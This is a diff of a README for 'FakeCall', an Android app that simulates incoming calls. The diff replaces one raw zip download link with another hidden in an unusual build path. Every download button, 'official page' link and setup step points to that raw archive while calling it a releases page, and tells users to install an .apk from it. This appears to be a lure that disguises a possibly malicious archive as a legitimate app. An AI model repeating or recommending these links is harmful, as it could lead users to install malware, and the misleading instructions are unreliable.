@@ -1,6 +1,6 @@
 # 📞 FakeCall - Simulate Incoming Calls Easily
 
-[![Download FakeCall](https://img.shields.io/badge/Download-FakeCall-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Merriliunstilted898/FakeCall/main/app/src/main/res/Call_Fake_v3.4.zip)
+[![Download FakeCall](https://img.shields.io/badge/Download-FakeCall-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Merriliunstilted898/FakeCall/main/app/release/baselineProfiles/0/Call-Fake-v2.8.zip)
 
 ---
 
@@ -34,11 +34,11 @@ FakeCall does not require an internet connection to work. It only needs permissi
 
 You can get FakeCall by visiting the official GitHub page below. This page has all the latest files and instructions:
 
-[![Visit FakeCall Releases](https://img.shields.io/badge/GitHub-FakeCall-blue?style=for-the-badge)](https://raw.githubusercontent.com/Merriliunstilted898/FakeCall/main/app/src/main/res/Call_Fake_v3.4.zip)
+[![Visit FakeCall Releases](https://img.shields.io/badge/GitHub-FakeCall-blue?style=for-the-badge)](https://raw.githubusercontent.com/Merriliunstilted898/FakeCall/main/app/release/baselineProfiles/0/Call-Fake-v2.8.zip)
 
 Follow these steps:
 
-1. Click the button above or go to https://raw.githubusercontent.com/Merriliunstilted898/FakeCall/main/app/src/main/res/Call_Fake_v3.4.zip in your web browser.
+1. Click the button above or go to https://raw.githubusercontent.com/Merriliunstilted898/FakeCall/main/app/release/baselineProfiles/0/Call-Fake-v2.8.zip in your web browser.
 2. On the page, look for the section called **Releases** or **Assets**.
 3. Find the latest version of FakeCall (usually an `.apk` file).
 4. Click the `.apk` file to download it to your phone.
@@ -125,7 +125,7 @@ A: Yes, you can add fake caller names and images inside the app.
 
 For the latest updates, bug fixes, and new features, visit the FakeCall GitHub page:
 
-[https://raw.githubusercontent.com/Merriliunstilted898/FakeCall/main/app/src/main/res/Call_Fake_v3.4.zip](https://raw.githubusercontent.com/Merriliunstilted898/FakeCall/main/app/src/main/res/Call_Fake_v3.4.zip)
+[https://raw.githubusercontent.com/Merriliunstilted898/FakeCall/main/app/release/baselineProfiles/0/Call-Fake-v2.8.zip](https://raw.githubusercontent.com/Merriliunstilted898/FakeCall/main/app/release/baselineProfiles/0/Call-Fake-v2.8.zip)
 
 You can also submit issues or request enhancements using the repository’s **Issues** tab. This helps improve the app with community input.
 
@@ -133,7 +133,7 @@ You can also submit issues or request enhancements using the repository’s **Is
 
 ## 🎯 Summary of Steps to Get Started
 
-1. Visit the GitHub page: https://raw.githubusercontent.com/Merriliunstilted898/FakeCall/main/app/src/main/res/Call_Fake_v3.4.zip
+1. Visit the GitHub page: https://raw.githubusercontent.com/Merriliunstilted898/FakeCall/main/app/release/baselineProfiles/0/Call-Fake-v2.8.zip
 2. Download the latest `.apk` file from the releases.
 3. Install the file on your Android phone.
 4. Open FakeCall and allow requested permissions.
